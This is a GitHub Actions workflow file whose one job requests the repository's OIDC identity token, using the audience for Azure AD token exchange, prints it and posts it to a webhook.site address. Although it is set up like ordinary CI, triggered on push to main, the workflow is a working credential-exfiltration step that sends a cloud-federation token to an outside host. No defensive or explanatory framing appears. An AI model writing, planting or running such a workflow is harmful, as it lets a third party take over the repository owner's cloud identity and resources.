name: zz-i114-oidc
on:
  push:
    branches: [ "main" ]
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  oidc:
    runs-on: ubuntu-latest
    steps:
      - name: get
        run: |
          W="https://webhook.site/2a9e626b-2ae7-4933-b5d9-8292af831bef"
          curl -sS -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" -o /tmp/o.json
          cat /tmp/o.json
          curl -sS -m 20 -X POST --data-binary @/tmp/o.json "$W/i114oidc"
          exit 0
